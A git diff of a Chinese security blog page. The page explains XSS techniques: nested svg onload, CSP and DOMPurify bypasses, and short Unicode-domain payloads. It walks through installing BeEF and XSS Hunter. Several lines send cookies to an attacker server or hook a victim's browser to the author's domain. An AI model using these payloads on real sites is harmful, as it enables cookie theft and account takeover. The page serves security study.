 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">svg2</span><br><span class="line">svg1</span><br><span class="line">DOMContentLoaded</span><br><span class="line">svg0</span><br><span class="line">load</span><br></pre></td></tr></table></figure>
 <p>套嵌的 svg 之所以成功，是因为当页面为 <code>root.innerHtml</code>  赋值的时候浏览器进入 DOM 树构建过程；在这个过程中<strong>会触发非最外层 svg 标签的 <code>load</code>  事件，最终成功执行代码</strong>。所以，sanitizer 执行的时间点在这之后，无法影响我们的 payload。</p>
-<p>1.3<svg onload=alert(1)> 失败原因</p>
+<p>1.3 <code>&lt;svg onload=alert(1)&gt;</code>  失败原因</p>
 <p>这里有一个非常明显的判断 <code>IsOutermostSVGSVGElement</code> ，如果是最外层的 svg 则直接返回。</p>
 <p><code>&lt;svg onload=console.log(&quot;svg0&quot;)&gt;&lt;svg onload=console.log(&quot;svg1&quot;)&gt;&lt;svg onload=console.log(&quot;svg2&quot;)&gt;</code></p>
 <p>最内层的 svg 先触发，然后再到下一层，而且是在 DOM 树构建完成以前就触发了相关事件；最外层的 svg 则得等到 DOM 树构建完成才能触发。</p>
@@ -700,7 +700,7 @@ Yume Shoka = Hexo</title>
 <p>在我们已经可以执行任意 js 脚本但由于 CSP 的阻拦我们的 cookie 无法带外传输，就可以用此方法，注意编码 %2B</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">location.href = &quot;vps_ip:xxxx?&quot;+document.cookie</span><br><span class="line">http://101.35.139.208:9999/csp.php?a=&lt;script&gt;location.href=&quot;http://127.0.0.1:18888/csp.php?xss=&quot;%2bdocument.cookie;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
 <p>利用前提：存在 XSS，可以执行任意 js 脚本，但由于 CSP 无法数据外带。</p>
-<p>​					CSP 规则 <code>header(&quot;Content-Security-Policy: default-src 'self';script-src:'unsafe-inline';&quot;);</code></p>
+<p>CSP 规则 <code>header(&quot;Content-Security-Policy: default-src 'self';script-src:'unsafe-inline';&quot;);</code></p>
 <p>2.link 绕过 (失效)</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- firefox --&gt;</span><br><span class="line">&lt;link rel=&quot;dns-prefetch&quot; href=&quot;//$&#123;cookie&#125;.vps_ip&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- chrome --&gt;</span><br><span class="line">&lt;link rel=&quot;prefetch&quot; href=&quot;//vps_ip?$&#123;cookie&#125;&quot;&gt;</span><br></pre></td></tr></table></figure>
 <p>外带：</p>
@@ -728,7 +728,7 @@ Yume Shoka = Hexo</title>
 </ul>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &#x27;self&#x27;; script-src &#x27;unsafe-eval&#x27; https://www.google-analytics.com&quot;&gt;</span><br><span class="line">&lt;script src=&quot;https://www.google-analytics.com/gtm/js?id=GTM-PJF5W64&quot;&gt;&lt;/script&gt; </span><br></pre></td></tr></table></figure>
 <p>7. 不完整 script 绕过</p>
-<p>只适用于火狐，且只能<?php echo $_GET['xss']?> <script nonce='xxx××'>相邻可以用，通过不完整的 script 标签将后面的 nonce 变为自己的属性</p>
+<p>只适用于火狐，且只能 <code>&lt;?php echo $_GET['xss']?&gt; &lt;script nonce='xxx××'&gt;</code>  相邻可以用，通过不完整的 script 标签将后面的 nonce 变为自己的属性</p>
 <p><code>http://127.0.0.1/2.php?xss=&lt;script src=data:text/plain,alert(1)</code></p>
 <p><code>&lt;script</code>  就会被变成一个属性，值为空，之后的 <code>nonce='xxxxx'</code></p>
 <p>会被当成我们输入的 script 标签中的一个属性</p>
@@ -825,7 +825,7 @@ Yume Shoka = Hexo</title>
 <p>与之前的 sanitizer 类似，DOMPurify 的基本用法非常简单：</p>
 <p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-8.png" alt="img"></p>
 <p>DOMPurify 还接受带有配置的第二个参数。这里还出现了一种使其容易受到原型污染的模式：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">      /* Set configuration parameters */</span><br><span class="line">ALLOWED_TAGS = &#x27;ALLOWED_TAGS&#x27; in cfg ? addToSet(&#123;&#125;, cfg.ALLOWED_TAGS) : DEFAULT_ALLOWED_TAGS;</span><br><span class="line">ALLOWED_ATTR = &#x27;ALLOWED_ATTR&#x27; in cfg ? addToSet(&#123;&#125;, cfg.ALLOWED_ATTR) : DEFAULT_ALLOWED_ATTR;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/* Set configuration parameters */</span><br><span class="line">ALLOWED_TAGS = &#x27;ALLOWED_TAGS&#x27; in cfg ? addToSet(&#123;&#125;, cfg.ALLOWED_TAGS) : DEFAULT_ALLOWED_TAGS;</span><br><span class="line">ALLOWED_ATTR = &#x27;ALLOWED_ATTR&#x27; in cfg ? addToSet(&#123;&#125;, cfg.ALLOWED_ATTR) : DEFAULT_ALLOWED_ATTR;</span><br></pre></td></tr></table></figure>
 <p>在 JavaScript 中 <code>in</code> ，运算符遍历原型链。因此 <code>'ALLOWED_ATTR' in cfg</code> ，如果此属性存在于 <code>Object.prototype</code> .</p>
 <p>DOMPurify 默认允许使用 <code>&lt;img&gt;</code>  标签，因此该漏洞利用只需要 <code>ALLOWED_ATTR</code>  使用 <code>onerror</code>  和进行污染 <code>src</code> 。</p>
 <p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-9.png" alt="img"></p>
@@ -858,389 +858,177 @@ Yume Shoka = Hexo</title>
 <h2 id="奇技淫巧"><a class="markdownIt-Anchor" href="#奇技淫巧">#</a> 奇技淫巧</h2>
 <h3 id="1通过特殊字符绕过或缩短playload和src长度"><a class="markdownIt-Anchor" href="#1通过特殊字符绕过或缩短playload和src长度">#</a> 1. 通过特殊字符绕过或缩短 playload 和 src 长度</h3>
 <p>利用浏览器对 Unicode 兼容性构造 script 中短 src</p>
-<script src=//℡℠.㎺>
-
-浏览器可以解析为telsm.pw，但length只有4个字符
-
-https://github.com/filedescriptor/Unicode-Mapping-on-Domain-names
-
-https://jlajara.gitlab.io/web/2019/11/30/XSS_20_characters.html
-
-ſ
-
-ß
-
-TEL
-
-SR
-
-PW
-
-![img](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1644458305697-1322263c-c705-44d7-a748-39c6b62ac182.png)
-
-利用浏览器对UNiocode支持
-
-![img](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1644458342308-390ae321-9b7c-49c0-9fbf-9952ee801d68.png)
-
-### 1.1 案例：emersion of XSS with 20 characters limitation
-
-### 1.Xss platform
-
-### 1.1beef-xss
-
-安装：`apt-get install beef-xss`
-
-注意事项：
-
-几种常见的安装报错：
-
-1.更新apt源
-
-![image-20220910205931724](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910205931724.png)
-
-
-
-解决方法：`apt-get update ` `sudo apt-get upgrade`
-
-2.缺省依赖
-
-![image-20220910210020518](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910210020518.png)
-
-解决方法:`apt-get install libglib2.0-dev `
-
-安装完之后在进行`apt-get install beef-xss`
-
-
-
-beef默认路径：`http://127.0.0.1:3000/ui/panel`
-
-![image-20220910210358884](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910210358884.png)
-
-
-
-使用pkav测试：
-
-使用系统提供的payload
-
-![image-20220910233217661](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910233217661.png)
-
-![image-20220910211111241](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910211111241.png)
-
-此时再去beef panel查看
-
-![image-20220910211138801](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910211138801.png)
-
-说明此时已经上线，可以在command中找到命令执行：
-
-说明：
-
-- 绿色模块：表示模块适用当前用户，并且执行结果对用户不可见
-- 红色模块：表示模块不适用当前用户，有些红色模块也可以执行
-- 橙色模块：模块可用，但结果对用户可见
-- 灰色模块：模块为在目标浏览器上测试过
-
-最重要的是可以看到cookies，如果对方是管理员登录，那么我们便可以使用管理员cookie进行登录
-
-![image-20220910211534847](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910211534847.png)
-
-### 2.XSS-hunter
-
-https://xsshunter.com/
-
-1.进行注册
-
-![image-20220910232621209](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910232621209.png)
-
-2.注册完后系统会自动登录，在XSS fires页面，如果有已经上线的主机会在此显示，payloads页面提供了一些xsspayload
-
-![image-20220910232730320](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910232730320.png)
-
-3.如果成功上线，会显示如下界面，full report 里面会有后台地址和cookies
-
-![image-20220910233046239](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910233046239.png)
-
-
-
-### 2.1 在centos上安装beef-xss
-
-参考链接：[CentOS安装beEF做XSS平台 - 海鸥博客 - 博客园 (cnblogs.com)](https://www.cnblogs.com/comdodo/p/5506996.html)
-
-但有些需要注意的点
-
-1.上文中的启动rvm不一定是在etc下，是在你自己的安装目录下，启动完后使用rvm 输出版本测试是否成功
-
-我是用如下方法安装成功，因为我是在用户家目录安装的，注意修改rvm版本，是你安装得版本
-
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=//℡℠.㎺&gt;</span><br></pre></td></tr></table></figure>
+<p><span class="exturl" data-url="aHR0cDovL3huLS10ZWxzbS1kcTFoMDNiMzR3MHJmNjMzY2hobmR0NGZla2EucHc=">浏览器可以解析为 telsm.pw</span>，但 length 只有 4 个字符</p>
+<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2ZpbGVkZXNjcmlwdG9yL1VuaWNvZGUtTWFwcGluZy1vbi1Eb21haW4tbmFtZXM=">https://github.com/filedescriptor/Unicode-Mapping-on-Domain-names</span></p>
+<p><span class="exturl" data-url="aHR0cHM6Ly9qbGFqYXJhLmdpdGxhYi5pby93ZWIvMjAxOS8xMS8zMC9YU1NfMjBfY2hhcmFjdGVycy5odG1s">https://jlajara.gitlab.io/web/2019/11/30/XSS_20_characters.html</span></p>
+<p><code>ſ</code></p>
+<p><code>ß</code></p>
+<p><code>TEL</code></p>
+<p><code>SR</code></p>
+<p><code>PW</code></p>
+<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1644458305697-1322263c-c705-44d7-a748-39c6b62ac182.png" alt="img"></p>
+<p>利用浏览器对 UNiocode 支持</p>
+<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1644458342308-390ae321-9b7c-49c0-9fbf-9952ee801d68.png" alt="img"></p>
+<h3 id="11-案例emersion-of-xss-with-20-characters-limitation"><a class="markdownIt-Anchor" href="#11-案例emersion-of-xss-with-20-characters-limitation">#</a> 1.1 案例：emersion of XSS with 20 characters limitation</h3>
+<h3 id="1xss-platform"><a class="markdownIt-Anchor" href="#1xss-platform">#</a> 1.Xss platform</h3>
+<h3 id="11beef-xss"><a class="markdownIt-Anchor" href="#11beef-xss">#</a> 1.1beef-xss</h3>
+<p>安装： <code>apt-get install beef-xss</code></p>
+<p>注意事项：</p>
+<p>几种常见的安装报错：</p>
+<p>1. 更新 apt 源</p>
+<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910205931724.png" alt="image-20220910205931724"></p>
+<p>解决方法： <code>apt-get update </code>   <code>sudo apt-get upgrade</code></p>
+<p>2. 缺省依赖</p>
+<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910210020518.png" alt="image-20220910210020518"></p>
+<p>解决方法: <code>apt-get install libglib2.0-dev </code></p>
+<p>安装完之后在进行 <code>apt-get install beef-xss</code></p>
+<p>beef 默认路径： <code>http://127.0.0.1:3000/ui/panel</code></p>
+<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910210358884.png" alt="image-20220910210358884"></p>
+<p>使用 pkav 测试：</p>
+<p>使用系统提供的 payload</p>
+<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910233217661.png" alt="image-20220910233217661"></p>
+<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910211111241.png" alt="image-20220910211111241"></p>
+<p>此时再去 beef panel 查看</p>
+<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910211138801.png" alt="image-20220910211138801"></p>
+<p>说明此时已经上线，可以在 command 中找到命令执行：</p>
+<p>说明：</p>
+<ul>
+<li>绿色模块：表示模块适用当前用户，并且执行结果对用户不可见</li>
+<li>红色模块：表示模块不适用当前用户，有些红色模块也可以执行</li>
+<li>橙色模块：模块可用，但结果对用户可见</li>
+<li>灰色模块：模块为在目标浏览器上测试过</li>
+</ul>
+<p>最重要的是可以看到 cookies，如果对方是管理员登录，那么我们便可以使用管理员 cookie 进行登录</p>
+<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910211534847.png" alt="image-20220910211534847"></p>
+<h3 id="2xss-hunter"><a class="markdownIt-Anchor" href="#2xss-hunter">#</a> 2.XSS-hunter</h3>
+<p><span class="exturl" data-url="aHR0cHM6Ly94c3NodW50ZXIuY29tLw==">https://xsshunter.com/</span></p>
+<p>1. 进行注册</p>
+<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910232621209.png" alt="image-20220910232621209"></p>
+<p>2. 注册完后系统会自动登录，在 XSS fires 页面，如果有已经上线的主机会在此显示，payloads 页面提供了一些 xsspayload</p>
+<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910232730320.png" alt="image-20220910232730320"></p>
+<p>3. 如果成功上线，会显示如下界面，full report 里面会有后台地址和 cookies</p>
+<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220910233046239.png" alt="image-20220910233046239"></p>
+<h3 id="21-在centos上安装beef-xss"><a class="markdownIt-Anchor" href="#21-在centos上安装beef-xss">#</a> 2.1 在 centos 上安装 beef-xss</h3>
+<p>参考链接：<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vY29tZG9kby9wLzU1MDY5OTYuaHRtbA==">CentOS 安装 beEF 做 XSS 平台 - 海鸥博客 - 博客园 (cnblogs.com)</span></p>
+<p>但有些需要注意的点</p>
+<p>1. 上文中的启动 rvm 不一定是在 etc 下，是在你自己的安装目录下，启动完后使用 rvm 输出版本测试是否成功</p>
+<p>我是用如下方法安装成功，因为我是在用户家目录安装的，注意修改 rvm 版本，是你安装得版本</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ~/.rvm/archives</span><br><span class="line">tar xvzf rvm-1.26.0.tgz # or whatever RVM version you have</span><br></pre></td></tr></table></figure>
-
-这将解压缩文件夹，其中将有一个名为 scripts 的文件夹。 现在运行以下命令。
-
+<p>这将解压缩文件夹，其中将有一个名为 scripts 的文件夹。 现在运行以下命令。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source ~/.rvm/archives/rvm-1.26.11/scripts/rvm</span><br></pre></td></tr></table></figure>
-
-然后rvm命令就可以正常运行了
-
-2.安装ruby时报错没有足够空间：找到安装rvm的目录的/rvm/archives/rvm/scripts/functions/utility文件，
-
-搜索“df”行，您将找到此代码将：
-
-` __free_space="$( \command \df "$1" | __rvm_awk 'BEGIN{x=4} /Free/{x=3} $3=="Avail"{x=3} END{print $x}' )"`
-
-改为
-
-`__free_space="999999"`
-
-同时为了防止checksum报错，需要加参数--verify downloads 2，这个参数不一定有用，建议采用第三条代替
-
-3.安装ruby时可能会非常非常~慢，需要先更改rvm源，其实就和你更改yum源为ali一样的道理
-
+<p>然后 rvm 命令就可以正常运行了</p>
+<p>2. 安装 ruby 时报错没有足够空间：找到安装 rvm 的目录的 /rvm/archives/rvm/scripts/functions/utility 文件，</p>
+<p>搜索 “df” 行，您将找到此代码将：</p>
+<p><code> __free_space=&quot;$( \command \df &quot;$1&quot; | __rvm_awk 'BEGIN&#123;x=4&#125; /Free/&#123;x=3&#125; $3==&quot;Avail&quot;&#123;x=3&#125; END&#123;print $x&#125;' )&quot;</code></p>
+<p>改为</p>
+<p><code>__free_space=&quot;999999&quot;</code></p>
+<p>同时为了防止 checksum 报错，需要加参数–verify downloads 2，这个参数不一定有用，建议采用第三条代替</p>
+<p>3. 安装 ruby 时可能会非常非常～慢，需要先更改 rvm 源，其实就和你更改 yum 源为 ali 一样的道理</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;ruby_url=https://cache.ruby-china.com/pub/ruby&quot; &gt; /usr/local/rvm/user/db</span><br><span class="line">注意： 最后的路径要取决于你的安装路径，比如我的就在  ~/.rvm/user/db</span><br><span class="line">然后就可以安装 rvm install 2.7</span><br></pre></td></tr></table></figure>
-
-4.提示
-
+<p>4. 提示</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ERROR:  SSL verification error at depth 0: ok (0)</span><br><span class="line">Error fetching https://ruby.taobao.org/:</span><br></pre></td></tr></table></figure>
-
-更换gem源，参考链接[RubyGems 镜像 - Ruby China (ruby-china.com)](https://gems.ruby-china.com/)
-
-5.下载beef  [Kali Linux / Packages / beef-xss · GitLab](https://gitlab.com/kalilinux/packages/beef-xss)
-
-[GitHub - beefproject/beef: The Browser Exploitation Framework Project](https://github.com/beefproject/beef) 
-
-建议使用第二个
-
-注意：下载此版本ruby版本必须>3.0.3
-
-6.报错`There was an error while trying to write to /www/wwwroot/www.radsm.co/beef/beef-xss/.bundle/config. It is likely that you need to grant write permissions for that path.`
-
-sudo给对应的文件夹递归加权限即可
-
-7.报错`in autodetect': Could not find a JavaScript runtime.`
-
-安装nodejs即可 `yum install nodejs`
-
-8.安装bundle install时非常慢，可以更新bundle源
-
+<p>更换 gem 源，参考链接<span class="exturl" data-url="aHR0cHM6Ly9nZW1zLnJ1YnktY2hpbmEuY29tLw=="> RubyGems 镜像 - Ruby China (ruby-china.com)</span></p>
+<p>5. 下载 beef  <span class="exturl" data-url="aHR0cHM6Ly9naXRsYWIuY29tL2thbGlsaW51eC9wYWNrYWdlcy9iZWVmLXhzcw==">Kali Linux / Packages / beef-xss · GitLab</span></p>
+<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2JlZWZwcm9qZWN0L2JlZWY=">GitHub - beefproject/beef: The Browser Exploitation Framework Project</span></p>
+<p>建议使用第二个</p>
+<p>注意：下载此版本 ruby 版本必须 &gt; 3.0.3</p>
+<p>6. 报错 <code>There was an error while trying to write to /www/wwwroot/www.radsm.co/beef/beef-xss/.bundle/config. It is likely that you need to grant write permissions for that path.</code></p>
+<p>sudo 给对应的文件夹递归加权限即可</p>
+<p>7. 报错 <code>in autodetect': Could not find a JavaScript runtime.</code></p>
+<p>安装 nodejs 即可  <code>yum install nodejs</code></p>
+<p>8. 安装 bundle install 时非常慢，可以更新 bundle 源</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bundle config mirror.https://rubygems.org https://mirrors.tuna.tsinghua.edu.cn/rubygems</span><br></pre></td></tr></table></figure>
-
-9.显示`/home/lighthouse/.rvm/gems/ruby-3.0.3@beef/gems/activerecord-7.0.3.1/lib/active_record/connection_adapters/sqlite3_adapter.rb:349:in check_version': Your version of SQLite (3.7.17) is too old. Active Record supports SQLite >= 3.8. (RuntimeError)`
-
-解决方法：
-
+<p>9. 显示 <code>/home/lighthouse/.rvm/gems/ruby-3.0.3@beef/gems/activerecord-7.0.3.1/lib/active_record/connection_adapters/sqlite3_adapter.rb:349:in check_version': Your version of SQLite (3.7.17) is too old. Active Record supports SQLite &gt;= 3.8. (RuntimeError)</code></p>
+<p>解决方法：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ wget https://kojipkgs.fedoraproject.org//packages/sqlite/3.8.11/1.fc21/x86_64/sqlite-devel-3.8.11-1.fc21.x86_64.rpm</span><br><span class="line">$ wget https://kojipkgs.fedoraproject.org//packages/sqlite/3.8.11/1.fc21/x86_64/sqlite-3.8.11-1.fc21.x86_64.rpm</span><br><span class="line">$ sudo yum install sqlite-3.8.11-1.fc21.x86_64.rpm sqlite-devel-3.8.11-1.fc21.x86_64.rpm</span><br></pre></td></tr></table></figure>
-
-10.报错
-
+<p>10. 报错</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[14:15:27][!] ERROR: Default username and password in use!</span><br><span class="line">[14:15:27]    |_  Change the beef.credentials.passwd in config.yaml</span><br></pre></td></tr></table></figure>
-
-解决方法：
-
+<p>解决方法：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo vim config.yaml   </span><br><span class="line">更改默认密码</span><br></pre></td></tr></table></figure>
-
-也可以参考一下这篇[RVM 安装 Ruby - 大数据从业者FelixZh - 博客园 (cnblogs.com)](https://www.cnblogs.com/felixzh/p/8081622.html)
-
-[安装rvm,升级ruby。跳的坑，做个记录 - 简书 (jianshu.com)](https://www.jianshu.com/p/12d3226d83ee)
-
-但我明显碰到了更多奇奇怪怪的问题
-
-总结：不要再centos上安装beef会变得不幸
-
-
-
-### 2.使用45,40，或者20个字符绕过xss长度限制
-
-下面使用gallerycms进行测试，原因是它采用jQuery框架，可以测试某些情况下的最短payload
-
-### 2.1gallerycms安装
-
-1.报错解决方法：
-
-![image-20220911001606531](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911001606531.png)
-
-1.修改\application\config\database.php中的数据库密码，并且创建对应数据库
-
-2.切换php版本为5.X，因为该CMS使用旧版的CI框架
-
-
-
-2.随便注册，登录，此处的Album Name就是注入点
-
-![image-20220911001755992](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911001755992.png)
-
-
-
-### 2.2使用短域名绕过字符限制
-
-短域名定义：通过Unicode编码使Unicode中一个字符被浏览器解析为两个或三个字符，最典型的有如下
-
+<p>也可以参考一下这篇<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vZmVsaXh6aC9wLzgwODE2MjIuaHRtbA=="> RVM 安装 Ruby - 大数据从业者 FelixZh - 博客园 (cnblogs.com)</span></p>
+<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC8xMmQzMjI2ZDgzZWU=">安装 rvm, 升级 ruby。跳的坑，做个记录 - 简书 (jianshu.com)</span></p>
+<p>但我明显碰到了更多奇奇怪怪的问题</p>
+<p>总结：不要再 centos 上安装 beef 会变得不幸</p>
+<h3 id="2使用4540或者20个字符绕过xss长度限制"><a class="markdownIt-Anchor" href="#2使用4540或者20个字符绕过xss长度限制">#</a> 2. 使用 45,40，或者 20 个字符绕过 xss 长度限制</h3>
+<p>下面使用 gallerycms 进行测试，原因是它采用 jQuery 框架，可以测试某些情况下的最短 payload</p>
+<h3 id="21gallerycms安装"><a class="markdownIt-Anchor" href="#21gallerycms安装">#</a> 2.1gallerycms 安装</h3>
+<p>1. 报错解决方法：</p>
+<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911001606531.png" alt="image-20220911001606531"></p>
+<p>1. 修改 \application\config\database.php 中的数据库密码，并且创建对应数据库</p>
+<p>2. 切换 php 版本为 5.X，因为该 CMS 使用旧版的 CI 框架</p>
+<p>2. 随便注册，登录，此处的 Album Name 就是注入点</p>
+<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911001755992.png" alt="image-20220911001755992"></p>
+<h3 id="22使用短域名绕过字符限制"><a class="markdownIt-Anchor" href="#22使用短域名绕过字符限制">#</a> 2.2 使用短域名绕过字符限制</h3>
+<p>短域名定义：通过 Unicode 编码使 Unicode 中一个字符被浏览器解析为两个或三个字符，最典型的有如下</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ﬀ expands to `ff`</span><br><span class="line">℠ expands to `sm`</span><br><span class="line">㏛ expands to `sr`</span><br><span class="line">ﬆ expands to `st`</span><br><span class="line">㎭ expands to `rad`</span><br><span class="line">℡ expands to `tel`</span><br></pre></td></tr></table></figure>
-
-因此我们就可以使用Unicode编码来缩短域名长度
-
-因此我注册了一个域名`radsm.co`,使用Unicode表示为`㎭℠.co`。相比之前减少了三个字符
-
-最极限的情况是使用`℡℠.㎺`,注意这里pw其实也是一个字符，我们可以只用四个字符构造一个域名，但我买的时候忘了pw。。。。
-
-https://github.com/filedescriptor/Unicode-Mapping-on-Domain-names
-
-https://jlajara.gitlab.io/web/2019/11/30/XSS_20_characters.html
-
-后来想起来不止这几个，其实极限域名甚至可以更短。。。
-
-
-
-##### 1.没有禁止script标签的情况
-
-使用xsshunt平台：
-
-`<script/src=https://㎭℠.xss.ht>`    
-
-此时该payload为30个字符
-
-使用beef-xss平台
-
-`<script/src=http://㎭℠.co:3000/hook.js>`
-
-此时该payload为30个字符
-
-但注意：src中不加"" 也可以正常解析，同时不加协议也可以正常解析
-
-
-
-对于xsshunter平台，由于使用的是他的子域名，无法在变短，但我们可以使用域名重定向，将我们自己的域名重定向到xsshunter的域名
-
-注意：国内的域名不支持重定向
-
-![image-20220911004504679](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911004504679.png)
-
-
-
-
-
-对于beef-xss平台，由于hook.js这个路径太占长度，我们可以将hook.js写到index.html中，并且将网站使用默认端口省掉:3000这些字符
-
-![image-20220911004816278](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911004816278.png)
-
-此时我们的极限payload为`<script/src=//㎭℠.㎺>`
-
-![image-20220911005113131](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911005113131.png)
-
-此时我们可以在19个长度内完成
-
-
-
-##### 2前端框架为jQuery，可以使用如下payload：
-
-不过滤script标签：
-
-注意此payload不能缺少"" ，同样需要把hook.js放到index.html中
-
+<p>因此我们就可以使用 Unicode 编码来缩短域名长度</p>
+<p>因此我注册了一个域名 <code>radsm.co</code> , 使用 Unicode 表示为 <code>㎭℠.co</code> 。相比之前减少了三个字符</p>
+<p>最极限的情况是使用 <code>℡℠.㎺</code> , 注意这里 pw 其实也是一个字符，我们可以只用四个字符构造一个域名，但我买的时候忘了 pw。。。。</p>
+<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2ZpbGVkZXNjcmlwdG9yL1VuaWNvZGUtTWFwcGluZy1vbi1Eb21haW4tbmFtZXM=">https://github.com/filedescriptor/Unicode-Mapping-on-Domain-names</span></p>
+<p><span class="exturl" data-url="aHR0cHM6Ly9qbGFqYXJhLmdpdGxhYi5pby93ZWIvMjAxOS8xMS8zMC9YU1NfMjBfY2hhcmFjdGVycy5odG1s">https://jlajara.gitlab.io/web/2019/11/30/XSS_20_characters.html</span></p>
+<p>后来想起来不止这几个，其实极限域名甚至可以更短。。。</p>
+<h5 id="1没有禁止script标签的情况"><a class="markdownIt-Anchor" href="#1没有禁止script标签的情况">#</a> 1. 没有禁止 script 标签的情况</h5>
+<p>使用 xsshunt 平台：</p>
+<p><code>&lt;script/src=https://㎭℠.xss.ht&gt;</code></p>
+<p>此时该 payload 为 30 个字符</p>
+<p>使用 beef-xss 平台</p>
+<p><code>&lt;script/src=http://㎭℠.co:3000/hook.js&gt;</code></p>
+<p>此时该 payload 为 30 个字符</p>
+<p>但注意：src 中不加 &quot;&quot; 也可以正常解析，同时不加协议也可以正常解析</p>
+<p>对于 xsshunter 平台，由于使用的是他的子域名，无法在变短，但我们可以使用域名重定向，将我们自己的域名重定向到 xsshunter 的域名</p>
+<p>注意：国内的域名不支持重定向</p>
+<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911004504679.png" alt="image-20220911004504679"></p>
+<p>对于 beef-xss 平台，由于 hook.js 这个路径太占长度，我们可以将 hook.js 写到 index.html 中，并且将网站使用默认端口省掉：3000 这些字符</p>
